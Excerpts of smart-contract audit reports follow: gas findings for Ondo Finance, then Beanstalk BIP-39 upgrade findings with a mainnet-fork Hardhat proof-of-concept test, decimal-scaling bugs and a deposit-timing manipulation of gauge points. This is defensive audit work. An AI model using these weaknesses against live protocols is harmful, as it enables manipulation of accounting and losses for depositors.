      // execute if it wasn't a new investor
      RateLimit storage mintState = investorIdToMintState[investorId];

      uint256 prevAmount = mintState.currentAmount;
      _checkAndUpdateRateLimitState(mintState, mintAmount);

      emit MintStateUpdated(
        investorAddress,
        investorId,
        prevAmount,
        mintState.currentAmount,
        mintState.limit - mintState.currentAmount
      );
    }
  }
```
The same optimization could be applied to `checkAndUpdateRedemptionLimit`.

**Ondo:**
Acknowledged.


### In `InvestorBasedRateLimiter::_setAddressToInvestorId` first read `addressToInvestorId[investorAddress]` then use it in the `if` statement check

**Description:** In `InvestorBasedRateLimiter::_setAddressToInvestorId` first read `addressToInvestorId[investorAddress]` then use it in the `if` statement check to save 1 storage read:
```solidity
  function _setAddressToInvestorId(
    address investorAddress,
    uint256 newInvestorId
  ) internal {
    // @audit GAS - do this first then use it in `if` check to save 1 storage read
    uint256 previousInvestorId = addressToInvestorId[investorAddress];

    // prevents creating the same existing association
    if (previousInvestorId == newInvestorId) {
      revert AddressAlreadyAssociated();
    }
```

**Ondo:**
Acknowledged.


### In `InvestorBasedRateLimiter::_setAddressToInvestorId` use `delete` when setting to zero for gas refund

**Description:** In `InvestorBasedRateLimiter::_setAddressToInvestorId` use `delete` when setting to zero:
```solidity
    // If the address is not being disassociated from all investors, increment the count
    // for the investor the address is being associated with.
    if (newInvestorId != 0) {
      ++investorAddressCount[newInvestorId];

      emit AddressToInvestorIdSet(
        investorAddress,
        newInvestorId,
        investorAddressCount[newInvestorId]
      );

       // @audit move this here when setting a valid value
       addressToInvestorId[investorAddress] = newInvestorId;
    }
    else {
       // @audit use `delete` when setting to 0 for gas refund
       delete addressToInvestorId[investorAddress];
    }
```

**Ondo:**
Acknowledged.


### Remove return parameters from `rOUSG::_mintShares` and `_burnShares` as they are never read

**Description:** Remove return parameters from `rOUSG::_mintShares` and `_burnShares` as they are never read. This saves 1 storage read in each function plus the cost of the return parameters.

**Ondo:**
Fixed in commit [dc91728](https://github.com/ondoprotocol/rwa-internal/commit/dc91728630a47ba351150287e48547a405a1282e).

**Cyfrin:** Verified.


### In `OUSGInstantManager::_mint` and `_redeem` cache `feeReceiver` and only emit fee event if fees are deducted

**Description:** In `OUSGInstantManager::_mint` cache `feeReceiver` and only emit fee event if fees are deducted to save 1 storage read:
```solidity
    // Transfer USDC
    if (usdcFees > 0) {
      // @audit GAS - cache `feeReceiver` and only emit fee event if
      // fees are deducted
      address feeReceiverCached = feeReceiver;

      usdc.transferFrom(msg.sender, feeReceiverCached, usdcFees);
      emit MintFeesDeducted(msg.sender, feeReceiverCached, usdcFees, usdcAmountIn);
    }
```

A similar optimization can be made in `_redeem`.

**Ondo:**
Acknowledged.


### Change `ROUSG::unwrap` to return amount of `OUSG` output tokens then use that as input when calling `_redeem` in `OUSGInstantManager::redeemRebasingOUSG`

**Description:** Change `ROUSG::unwrap` to return amount of `OUSG` output tokens then use that as input when calling `_redeem` in `OUSGInstantManager::redeemRebasingOUSG`:
```solidity
uint256 ousgAmountIn = rousg.unwrap(rousgAmountIn);

usdcAmountOut = _redeem(ousgAmountIn);
```

**Ondo:**
Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-04-18-cyfrin-ondo-finance.md ------


------ FILE START car/reports_md/2024-05-02-cyfrin-beanstalk-bip-39-v1-2.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Carlos Amarante](https://twitter.com/carlitox477)

**Assisting Auditors**

[Dacian](https://twitter.com/DevDacian)


---

# Findings
## High Risk


### Failure to add modified facets and facets with modified dependencies to `bips::bipSeedGauge` breaks the protocol

**Description:** At the time of a Diamond Proxy upgrade, modified facets are cut by their inclusion in the relevant function within [`bips.js`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/scripts/bips.js). are Currently, the [`bipSeedGauge` function](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/scripts/bips.js#L198-L240) appears to be missing `FieldFacet`, `BDVFacet`, `ConvertFacet`, and `WhitelistFacet` which have all been modified since the previous upgrade. Moreover, the addition of facets with modifications to their libraries has not been taken into account, resulting in multiple issues that break the protocol.

**Impact:** At first glance, given that it appears none of these facets or the libraries they use contain significant modifications to the core business logic of Beanstalk, the impact could be considered low. However, given there have been significant alterations to other libraries utilized by multiple facets, this is not the case. One of the more severe issues involves the issuance of significantly increased amounts of Stalk than intended which therefore breaks protocol accounting.

**Proof of Concept:** A list of all modified facets can be obtained by running the following command:
```bash
git diff --stat 7606673..dfb418d -- ".sol" ":\!protocol/test/" ":\!protocol/contracts/mocks/*" | grep "Facet.sol"
```
Output:
```
protocol/contracts/beanstalk/barn/UnripeFacet.sol  | 360 +++++++++------
protocol/contracts/beanstalk/field/FieldFacet.sol  |   4 +-
protocol/contracts/beanstalk/silo/BDVFacet.sol     |  12 +-
protocol/contracts/beanstalk/silo/ConvertFacet.sol |   8 +-
.../contracts/beanstalk/silo/WhitelistFacet.sol    |  79 +++-
.../contracts/beanstalk/sun/GaugePointFacet.sol    |  39 ++
.../beanstalk/sun/SeasonFacet/SeasonFacet.sol      | 120 +++--
.../sun/SeasonFacet/SeasonGettersFacet.sol         | 248 ++++++++++
```

A list of all modified libraries can be obtained by running the following command:
```bash
git diff --stat 7606673..dfb418d -- "*.sol" ":\!protocol/test/*" ":\!protocol/contracts/mocks/*" | grep "Lib.*\.sol"
```
Output:
```
.../contracts/libraries/Convert/LibChopConvert.sol |  60 +++
.../contracts/libraries/Convert/LibConvert.sol     |  42 +-
.../contracts/libraries/Convert/LibConvertData.sol |   3 +-
.../libraries/Convert/LibUnripeConvert.sol         |  18 +-
.../contracts/libraries/Convert/LibWellConvert.sol |   3 +-
.../contracts/libraries/Curve/LibBeanMetaCurve.sol |  15 +
.../contracts/libraries/Curve/LibMetaCurve.sol     |  61 ++-
protocol/contracts/libraries/LibCases.sol          | 161 +++++++
protocol/contracts/libraries/LibChop.sol           |  65 +++
protocol/contracts/libraries/LibEvaluate.sol       | 297 ++++++++++++
protocol/contracts/libraries/LibFertilizer.sol     |   2 +
protocol/contracts/libraries/LibGauge.sol          | 330 +++++++++++++
protocol/contracts/libraries/LibIncentive.sol      |  20 +-
.../contracts/libraries/LibLockedUnderlying.sol    | 509 +++++++++++++++++++++
protocol/contracts/libraries/LibUnripe.sol         | 180 ++++++--
.../libraries/Minting/LibCurveMinting.sol          |  26 +-
.../contracts/libraries/Minting/LibWellMinting.sol |  30 +-
.../libraries/Oracle/LibBeanEthWellOracle.sol      |  55 ---
.../contracts/libraries/Oracle/LibEthUsdOracle.sol |   3 +-
.../contracts/libraries/Oracle/LibUsdOracle.sol    |  18 +-
.../libraries/Silo/LibLegacyTokenSilo.sol          |   4 -
protocol/contracts/libraries/Silo/LibTokenSilo.sol |  18 +-
protocol/contracts/libraries/Silo/LibWhitelist.sol | 181 ++++++--
.../libraries/Silo/LibWhitelistedTokens.sol        |  47 ++
protocol/contracts/libraries/Well/LibWell.sol      | 217 ++++++++-
```

The following coded proof of concept has been written to demonstrate the broken Stalk accounting:
```javascript
const { expect } = require('chai');
const { takeSnapshot, revertToSnapshot } = require("../utils/snapshot.js");
const { BEAN, BEAN_3_CURVE, UNRIPE_BEAN, UNRIPE_LP, WETH, BEAN_ETH_WELL, PUBLIUS, ETH_USD_CHAINLINK_AGGREGATOR } = require('../utils/constants.js');
const { bipSeedGauge } = require('../../scripts/bips.js');
const { getBeanstalk } = require('../../utils/contracts.js');
const { impersonateBeanstalkOwner, impersonateSigner } = require('../../utils/signer.js');
const { ethers } = require('hardhat');

const { impersonateBean, impersonateEthUsdChainlinkAggregator} = require('../../scripts/impersonate.js');
let silo, siloExit, bean

let grownStalkBeforeUpgrade, grownStalkAfterUpgrade
let snapshotId
let whitelistedTokenSnapshotBeforeUpgrade, whitelistedTokenSnapshotAfterUpgrade

const whitelistedTokens = [BEAN, BEAN_3_CURVE, UNRIPE_BEAN, UNRIPE_LP, BEAN_ETH_WELL]

const whitelistedTokensNames = ["BEAN", "BEAN:3CRV CURVE LP", "urBEAN", "urBEAN:WETH", "BEAN:WETH WELLS LP"]
const beanHolderAddress = "0xA9Ce5196181c0e1Eb196029FF27d61A45a0C0B2c"
let beanHolder

/**
 * Async function
 * @returns tokenDataSnapshot: Mapping from token address to (name,stemTip)
 */
const getTokenDataSnapshot = async()=>{
  tokenDataSnapshot = new Map()

  for(token of whitelistedTokens){
    tokenDataSnapshot.set(token,{
      name: whitelistedTokensNames[whitelistedTokens.indexOf(token)],
      stemTip: await silo.stemTipForToken(token)
    })
  }
  return tokenDataSnapshot
}



const forkMainnet = async()=>{
  try {
    await network.provider.request({
      method: "hardhat_reset",
      params: [
        {
          forking: {
            jsonRpcUrl: process.env.FORKING_RPC,
            blockNumber: 18619555-1 //a random semi-recent block close to Grown Stalk Per Bdv pre-deployment
          },
        },
      ],
    });
  } catch(error) {
    console.log('forking error in seed Gauge');
    console.log(error);
    return
  }
}

const initializateContractsPointers = async(beanstalkAddress)=>{
  tokenSilo = await ethers.getContractAt('TokenSilo', beanstalkAddress);
  seasonFacet = await ethers.getContractAt('ISeasonFacet', beanstalkAddress);
  siloFacet = await ethers.getContractAt('SiloFacet', beanstalkAddress);
  silo = await ethers.getContractAt('ISilo', beanstalkAddress);
  siloExit = await ethers.getContractAt('SiloExit', beanstalkAddress);
  admin = await ethers.getContractAt('MockAdminFacet', beanstalkAddress);
  well = await ethers.getContractAt('IWell', BEAN_ETH_WELL);
  weth = await ethers.getContractAt('IWETH', WETH)
  bean = await ethers.getContractAt('IBean', BEAN)
  beanEth = await ethers.getContractAt('IWell', BEAN_ETH_WELL)
  beanEthToken = await ethers.getContractAt('IERC20', BEAN_ETH_WELL)
  unripeLp = await ethers.getContractAt('IERC20', UNRIPE_LP)
  beanMetapool = await ethers.getContractAt('MockMeta3Curve', BEAN_3_CURVE)
  chainlink = await ethers.getContractAt('MockChainlinkAggregator', ETH_USD_CHAINLINK_AGGREGATOR)
}

const impersonateOnchainSmartContracts = async() => {
  publius = await impersonateSigner(PUBLIUS, true)
  await impersonateEthUsdChainlinkAggregator()
  await impersonateBean()
  owner = await impersonateBeanstalkOwner()
}

const deposit = async(signer, tokenDataSnapshot) => {
  await network.provider.send("hardhat_setBalance", [
    signer.address,
    "0x"+ethers.utils.parseUnits("1000",18).toString()
  ]);


  beanToDeposit = await bean.balanceOf(signer.address)
  // console.log(`Beans to deposit: ${ethers.utils.formatUnits(beanToDeposit,6)}`)
  beanStemTip = tokenDataSnapshot.get(BEAN).stemTip
  await siloFacet.connect(signer).deposit(BEAN,beanToDeposit,0) // 0 = From.EXTERNAL
  return await tokenSilo.getDepositId(BEAN, beanStemTip, )
}

describe('Facet upgrade POC', function () {
  before(async function () {

    // Get users to impersonate
    [user, user2] = await ethers.getSigners()

    // fork mainnet
    await forkMainnet()

    // Replace on chain smart contract for testing
    await impersonateOnchainSmartContracts()
    beanHolder = await impersonateSigner(beanHolderAddress)

    this.beanstalk = await getBeanstalk()

    await initializateContractsPointers(this.beanstalk.address)

    // Before doing anything we record some state variables that should hold
    whitelistedTokenSnapshotBeforeUpgrade = await getTokenDataSnapshot()

    // We do a deposit
    depositId = await deposit(beanHolder,whitelistedTokenSnapshotBeforeUpgrade)

    grownStalkBeforeUpgrade = await siloExit.balanceOfGrownStalk(beanHolder.address,BEAN)

    // seed Gauge
    await bipSeedGauge(true, undefined, false)
    console.log("BIP-39 initiated\n")

    whitelistedTokenSnapshotAfterUpgrade = await getTokenDataSnapshot(silo)
    grownStalkAfterUpgrade = await siloExit.balanceOfGrownStalk(beanHolder.address,BEAN)
  });

  beforeEach(async function () {
    snapshotId = await takeSnapshot()
  });

  afterEach(async function () {
    await revertToSnapshot(snapshotId)
  });


  describe('init state POC', async function () {

    it("Grown stalk backward compatibility",async()=>{
      expect(grownStalkBeforeUpgrade).to.be.eq(grownStalkAfterUpgrade, "Grown stalk for a deposit after BIP-39 upgrade is not the same than before the upgrade")
    })


    it('Stem tip backward compatibility',async()=>{
      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN).stemTip,"BEAN stem tip is not the same than after the upgrade")
      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN_3_CURVE).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN_3_CURVE).stemTip,"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade")
      expect(whitelistedTokenSnapshotBeforeUpgrade.get(BEAN_ETH_WELL).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(BEAN_ETH_WELL).stemTip,"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade")
      expect(whitelistedTokenSnapshotBeforeUpgrade.get(UNRIPE_BEAN).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(UNRIPE_BEAN).stemTip,"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade")
      expect(whitelistedTokenSnapshotBeforeUpgrade.get(UNRIPE_LP).stemTip).to.be.equal(whitelistedTokenSnapshotAfterUpgrade.get(UNRIPE_LP).stemTip,"BEAN:3CRV Curve LP stem tip is not the same than after the upgrade")

    })
  })
})
```
As is shown by the reverting expectations, failure to add `SiloFacet` to the upgrade breaks the milestone stem update and the grown stalk accounting.

If the solution for the issue relating to the previous milestone stem being scaled for use with the new gauge point system (which uses untruncated values moving forward) is implemented without updating the `SiloFacet`, then the previous `LibTokenSilo::stemTipForToken` implementation is used. This allows deposits performed before the upgrade to receive significantly more grown stalk than intended.

**Recommended Mitigation:** Be sure to always add all modified facets and all facets whose library dependencies have been modified to the upgrade script. It is highly recommended to develop an upgrade simulation test suite to catch other similar errors in the upgrade process in the future.


### The previous milestone stem should be scaled for use with the new gauge point system which uses untruncated values moving forward

**Description:** Within the Beanstalk Silo, the milestone stem for a given token is the cumulative amount of grown stalk per BDV for this token at the last `stalkEarnedPerSeason` update. Previously, the milestone stem was stored in its truncated representation; however, the seed gauge system now stores the value in its untruncated form due to the new granularity of grown stalk and the frequency with which these values are updated.

At the time of upgrade, the previous (truncated) milestone stem for each token should be scaled for use with the gauge point system by multiplying up by a factor of `1e6`. Otherwise, there will be a mismatch in decimals when [calculating the stem tip](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L388-L391).

```solidity
_stemTipForToken = s.ss[token].milestoneStem +
    int96(s.ss[token].stalkEarnedPerSeason).mul(
        int96(s.season.current).sub(int96(s.ss[token].milestoneSeason))
    );
```

**Impact:** The mixing of decimals between the old milestone stem (truncated) and the new milestone stem (untruncated, after the first `gm` call following the BIP-39 upgrade) breaks the existing grown stalk accounting, resulting in a loss of grown stalk for depositors.

**Proof of Concept:** The [previous implementation](https://github.com/BeanstalkFarms/Beanstalk/blob/7606673/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L376-L391) returns the cumulative stalk per BDV with 4 decimals:
```solidity
    function stemTipForToken(address token)
        internal
        view
        returns (int96 _stemTipForToken)
    {
        AppStorage storage s = LibAppStorage.diamondStorage();

        // SafeCast unnecessary because all casted variables are types smaller that int96.
        _stemTipForToken = s.ss[token].milestoneStem +
        int96(s.ss[token].stalkEarnedPerSeason).mul(
            int96(s.season.current).sub(int96(s.ss[token].milestoneSeason))
        ).div(1e6); //round here
    }
```

Which can be mathematically abstracted to:
$$StemTip(token) = getMilestonStem(token) + (current \ season - getMilestonStemSeason(token)) \times \frac{stalkEarnedPerSeason(token)}{10^{6}}$$

This division by $10^{6}$ happens because the stem tip previously had just 4 decimals. This division allows backward compatibility by not considering the final 6 decimals. Therefore, the stem tip **MUST ALWAYS** have 4 decimals.

The milestone stem is now [updated in each `gm` call](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L265-L268) so long as all [LP price oracles pass their respective checks](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L65-L67). Notably, the milestone stem is now stored with 10 decimals (untruncated), hence why the second term of the abstraction has omitted the `10^{6}` division in `LibTokenSilo::stemTipForTokenUntruncated`.

However, if the existing milestone stem is not escalated by $10^{6}$ then the addition performed during the upgrade and in subsequent `gm` calls makes no sense. This is mandatory to be handled within the upgrade otherwise every part of the protocol which calls `LibTokenSilo.stemTipForToken` will receive an incorrect value, except for BEAN:ETH Well LP (given it was created after the Silo v3 upgrade).

Some instances where this function is used include:
* [`EnrootFacet::enrootDeposit`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L91)
* [`EnrootFacet::enrootDeposits`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L131)
* [`MetaFacet::uri`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/metadata/MetadataFacet.sol#L36)
* [`ConvertFacet::_withdrawTokens`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L129-148)
* [`LibSilo::__mow`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L382)
* [`LibSilo::_removeDepositFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L545)
* [`LibSilo::_removeDepositsFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L604)
* [`Silo::_plant`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L110)
* [`TokenSilo::_deposit`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L173)
* [`TokenSilo::_transferDeposits`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L367)
* [`LibLegacyTokenSilo::_mowAndMigrate`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L306)
* [`LibTokenSilo::_mowAndMigrate`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L306)

As can be observed, critical parts of the protocol are compromised, leading to further cascading issues.

**Recommended Mitigation:** Scale up the existing milestone stem for each token:
```diff
for (uint i = 0; i < siloTokens.length; i++) {
+   s.ss[siloTokens[i]].milestoneStem = int96(s.ss[siloTokens[i]].milestoneStem.mul(1e6));
```

\clearpage
## Medium Risk


### Incorrect handling of decimals in `LibLockedUnderlying::getPercentLockedUnderlying` results in an incorrect value being returned, affecting the temperature and Bean to maxLP gaugePoint per BDV ratio updates in each subsequent call to `SeasonFacet::gm` when `unripe asset supply < 10M`

**Description:** Due to the Barn Raise and the associated Beans underlying Unripe assets, the number of tradable Beans does not equal the total Bean supply. Within the calculation of L2SR, the term "locked liquidity" refers to the portion of liquidity in the BEAN:ETH WELL that cannot be retrieved through chopping until the corresponding Fertilizer is paid.

The exchange ratio for the corresponding underlying asset can be summarized in the following formula:

$$\frac{Paid Fertilizer}{Minted Fertilizer} \times \frac{totalUnderlying(urAsset)}{supply(urAsset)}$$

The second factor indicates the amount of the underlying asset backing each unripe asset, while the first indicates the distribution of the underlying asset based on the ratio of Fertilizer that is already paid.

When a user chops an unripe asset, it is burned in exchange for a penalized amount of the underlying asset. The remaining underlying asset is now shared among the remaining unripe asset holders, meaning that if another user tries to chop the same amount of unripe asset at a given recapitalization rate, they will receive a greater amount of underlying asset.

For instance, assume that:
* 50% of the minted Fertilizer is paid
* A current supply of 70M
* An underlying amount of 22M

If Alice chops 1M unripe tokens:
$$1,000,000 \times 0.50 \times \frac{22,000,000}{70,000,000} =$$
$$1,000,000 \times 0.50 \times 0.31428 =$$
$$1,000,000 \times 0.50 \times 0.31428 =$$
$$1,000,000 \times 0.15714285 = $$
$$157,142.85$$

If Bob then chops the same amount of tokens:
$$1,000,000 \times 0.50 \times \frac{22,000,000-157,142.85}{70,000,000 - 1,000,000} =$$
$$1,000,000 \times 0.50 \times \frac{21,842,857.15}{69,000,000} =$$
$$1,000,000 \times 0.50 \times \frac{21,842,857.15}{69,000,000} =$$
$$1,000,000 \times 0.50 \times 0.3165 =$$
$$158,281.57$$

Given that the assumption of chopping the total unripe asset supply in one step is highly unlikely, the Beanstalk Farms team decided to perform an off-chain regression based on the average unripe asset per unripe asset holder. This yields an approximation for the percentage locked underlying token per asset based on the current unripe asset supply. An on-chain look-up table is used to retrieve the values of this regression; however, the issue with its implementation lies in its failure to account for unripe token decimals when compared with the inline conditional supply constants [`1_000_000`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L61), [`5_000_000`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L62), and [`10_000_000`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L63) as the intervals on which the iterative simulation was performed. Given these constants are not a fixed-point representation of the numbers they are intended to represent, [comparison](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L286) with the [6-decimal supply](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L60) will be incorrect.

**Impact:** Given that unripe assets have 6 decimals, `LibLockedUnderlying::getPercentLockedUnderlying` will tend to execute [this conditional branch](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibLockedUnderlying.sol#L63-L173), producing an incorrect calculation of locked underlying whenever the supply of the unripe asset is below 10M.

In the given scenario, this error would cascade into an incorrect calculation of L2SR, affecting how the temperature and Bean to maxLP gaugePoint per BDV ratio should be updated in the call to [`Weather::calcCaseIdandUpdate`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L68) within [`SeasonFacet::gm`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L51).

**Proof of Concept:** A differential test (see Appendix A) was written to demonstrate this issue based on CSV provided by the Beanstalk Farms team. Modifications to the CSV include:
* Adding headers: recapPercentage, urSupply, lockedPercentage
* Generate a CSV without whitespaces
* Round the first column to 3 decimals
* For the third column, delete `e18` and round values to 18 decimals

**Recommended Mitigation:** Scale each inline constant that is compared against the unripe supply by 6 decimals.

For similar cases in the future, differential testing between the expected and actual outputs is effective in catching bugs of this type which rely on pre-computed off-chain values.


### Gauge point updates should be made considering the time-weighted average deposited LP BDV rather than instantaneous at the time of Sunrise

**Description:** Prior to the introduction of the Seed Gauge System, the Grown Stalk per BDV for whitelisted assets was static and could only be changed via governance. The Seed Gauge System now allows Beanstalk to target an amount of Grown Stalk per BDV that should be issued per Season, with Gauge Points being introduced to determine how the Grown Stalk issued that Season should be distributed between whitelisted LP tokens.

Gauge Points are updated every Season, when `LibGauge::stepGauge` is called within `SeasonFacet::gm`. This Gauge Point update is currently performed by [considering the instantaneous total deposited LP BDV](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibGauge.sol#L115-L122) at the time of the `gm` call. However, this value can be subject to manipulation so the Seed Gauge System should instead use a time-weighted average deposited LP BDV over the previous Season duration.

**Impact:** Given the Gauge Points for a given whitelisted LP can only increase/decrease by one point per Season, and the Bean to max LP GP per BDV ratio is capped at 100%, the incentive to perform this attack is relatively low. However, a large deposit immediately before the Sunrise call, and withdrawal immediately after, could nonetheless result in manipulation meaning the Seed Gauge system does not work as intended.

**Recommended Mitigation:** Consider calculating time-weighted average deposited LP BDVs over the previous Season duration rather than using an instantaneous value. The BDV to include in the calculation at each block should be the one at the end of the previous block to avoid in-block manipulation. These values should be stored and the update should be triggered whenever a function is called which modifies the total deposited BDV in any way.


### Gauge point constants in `InitBipSeedGauge` should be scaled by the ratio of deposited BDV

**Description:** The [current initial Gauge Point (GP) distribution](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/init/InitBipSeedGauge.sol#L68-L69) is based solely on the grown stalk per season per BDV for each LP, whereas it should be determined by considering the deposited BDV per LP.

Considering the following math which underlies the behavior of the gauge system:
$$depositedBDVRatio(LP) = \frac{silo.totalDepositedBDV(LP)}{\sum_{wlpt}^{wlpt \in Whitelisted \ LP \ Tokens} silo.totalDepositedBDV} $$
$GP_{s}(LP) =$
1. $depositedBDVRatio(LP) > LP.optimalDepositedBDVRatio \land GP_{s-1}(LP) \leq 1gp \Rightarrow GP_{s}(LP) = 0$
2. $depositedBDVRatio(LP) > LP.optimalDepositedBDVRatio \land GP_{s-1}(LP) > 1gp \Rightarrow GP_{s}(LP) = GP_{s-1}(LP)- 1gp$
3. $depositedBDVRatio(LP) \leq LP.optimalDepositedBDVRatio \Rightarrow GP_{s}(LP) = GP_{s-1}(LP) + 1gp$

It can be seen that the formula relies on the previous $GP_{s-1}(LP)$, where $s$ indicates the current season number and deposited BDV ratio. Moreover, it is evident that the intention of this mechanism is to incentivize the Beanstalk protocol to have a pre-defined optimal deposited BDV ratio for each LP. Consequently, the initial assignment of GP should consider this intention.

**Impact:** An incorrect initial GP distribution can result in unintended initial behavior, which can take a significant amount of time to rectify given that gauge points can only increase/decrease by one point per season as defined in [`GaugePointFacet::defaultGaugePointFunction`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/GaugePointFacet.sol#L26-L38).

**Proof of Concept:**
```solidity
// InitBipSeedGauge.sol
uint128 beanEthGp = uint128(s.ss[C.BEAN_ETH_WELL].stalkEarnedPerSeason) * 500 * 1e12;
uint128 bean3crvGp = uint128(s.ss[C.CURVE_BEAN_METAPOOL].stalkEarnedPerSeason) * 500 * 1e12
```

As observed, the initial GP assignment is determined by the stalk earned per season before BIP-39, with the following values:
* BEAN:3CRV Curve LP: `3.25e6`
* BEAN:ETH Well LP: `4.5e6`

These values are not correlated with the total BDV deposited per LP. Consequently, the initial assignment of GP is made with incorrect values.

**Recommended Mitigation:** Considering that [one gauge point is equal to 1e18](https://github.com/BeanstalkFarms/Beanstalk/blob/08ca0d7d495c94f2a4366fb7f99da561b74cc1c0/protocol/contracts/beanstalk/sun/GaugePointFacet.sol#L19), the following modification should be made:

```diff
//  InitBipSeedGauge.sol
+   // BDV has 6 decimals
+   uint256 beanEthBDV = s.siloBalances[C.BEAN_ETH_WELL].depositedBdv
+   uint256 bean3crvBDV = s.siloBalances[C.CURVE_BEAN_METAPOOL].depositedBdv
+   uint256 lpTotalBDV = beanEthBDV + bean3crvGp
-   uint128 beanEthGp = uint128(s.ss[C.BEAN_ETH_WELL].stalkEarnedPerSeason) * 500 * 1e12;
-   uint128 bean3crvGp = uint128(beanEthBDV) * 500 * 1e12
+   // Assume 1 BDV = 1GP for initialization
+   uint128 beanEthGp = uint128(beanEthBDV * 10e6).div(lpTotalBDV) * 1e12;
+   uint128 bean3crvGp = uint128(bean3crvBDV * 10e6).div(lpTotalBDV) * 1e12
```


### Incorrect calculation of unmigrated BDVs for use in `InitBipSeedGauge::init`

**Description:** The current values for the [constants](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/init/InitBipSeedGauge.sol#L35-L39) in `InitBipSeedGauge::init` are an estimation and not finalized. To correctly calculate the BDV, the Beanstalk Farms team simulates migrating all the remaining unmigrated deposits at the block in which BIP-38 was executed such that the change of BDV corresponding to the underlying asset in `BDVFacet::unripeLPToBDV` is considered and subject to the slippage incurred at the time of liquidity migration. The `deposits.json` file contains a list of outstanding deposits at the Silo V3 deployment block `17671557`, so the script considers all `removeDeposit` events after this point as deposits to be removed from the unmigrated BDV. By filtering from the Enroot fix deployment block `17251905`, if an account has removed its deposit after the Enroot fix but before Silo V3 was deployed, this would improperly assume the deposits have been migrated when they haven't. Additionally, given the script is forking mainnet at the BIP-38 execution block `18392690`, it is not correct to use `18480579` as the end block for event filtering.

